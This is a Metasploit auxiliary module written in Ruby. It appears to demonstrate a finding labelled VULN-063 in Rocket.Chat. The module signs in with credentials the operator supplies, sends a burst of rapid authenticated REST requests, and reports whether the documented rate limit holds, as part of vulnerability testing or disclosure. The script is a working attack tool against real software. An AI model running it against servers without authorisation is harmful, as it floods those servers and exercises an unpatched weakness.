class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat REST rate-limit absence demonstrator (VULN-063)',
        'Description' => %q{
          Rocket.Chat's default per-route REST rate limiter does not apply on a fresh
          install, so an unauthenticated-by-default or ordinary caller can hammer any
          route. This module signs in with the operator's credentials, sends CALLS
          rapid requests to TARGETURI and reports how many were allowed versus
          rate-limited, demonstrating that the documented limit is not enforced. The
          operator sets CALLS and the route; the module reads only.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/channels.list.joined']),
      OptString.new('USERNAME', [true, 'A valid account on the target', '']),
      OptString.new('PASSWORD', [true, 'That account\'s password', '']),
      OptString.new('CALLS', [true, 'How many rapid calls to send (well above the documented default of 10 per minute)', '20']),
      OptString.new('TOTPCODE', [false, 'The current second-factor code, when the account given has one enrolled', ''])
    ])
  end

  # Sign in with credentials the operator already has. A module never
  # creates an account, seeds data, or changes state to make itself work.
  # Rocket.Chat answers POST /api/v1/login with a token pair rather than a
  # cookie, so the pair is what every later request carries. TOTPCODE is for
  # an account with a second factor enrolled: the operator supplies the
  # current code with the password, as they would in any other client.
  def authenticate
    creds = { 'user' => datastore['USERNAME'], 'password' => datastore['PASSWORD'] }
    creds['code'] = datastore['TOTPCODE'] unless datastore['TOTPCODE'].to_s.empty?
    2.times do |attempt|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(LOGIN_PATH),
        'ctype' => 'application/json',
        'data' => creds.to_json
      })
      if res && res.code == 200
        doc = parse_json(res)
        @auth_token = doc.dig('data', 'authToken')
        @user_id = doc.dig('data', 'userId')
        unless @auth_token.nil? || @user_id.nil?
          vprint_status("#{peer} - Signed in as #{datastore['USERNAME']} (user id #{@user_id})")
          return true
        end
      end
      sleep(2) if attempt.zero?   # ride out a transient per-route rate limit
    end
    false
  end

  def run
    unless authenticate
      fail_with(Failure::NoAccess, 'Could not sign in with the credentials given.')
    end

    res = burst(datastore['CALLS'].to_i)
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = @ok >= datastore['CALLS'].to_i && @blocked.zero?
    fail_with(Failure::NotVulnerable, 'VULN-063: the attack did not land') unless hit

    print_good("#{peer} - VULN-063: exploited")
    print_good("#{peer} - #{@ok}/#{datastore['CALLS']} rapid calls allowed, #{@blocked} rate-limited: the documented 10/min limit is not enforced")
    print_status('  a patched (restarted) install would start returning HTTP 429 well before this many calls')
    path = store_loot('blue_spider.vuln_063', 'text/plain', rhost, res.body.to_s, 'vuln_063.txt', 'VULN-063 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-063 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  def burst(n)
    codes = []
    last = nil
    n.times do
      last = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'headers' => { 'X-Auth-Token' => @auth_token, 'X-User-Id' => @user_id }
      })
      codes << (last ? last.code : 0)
    end
    @codes = codes
    @blocked = codes.count(429)
    @ok = codes.count(200)
    last
  end
end
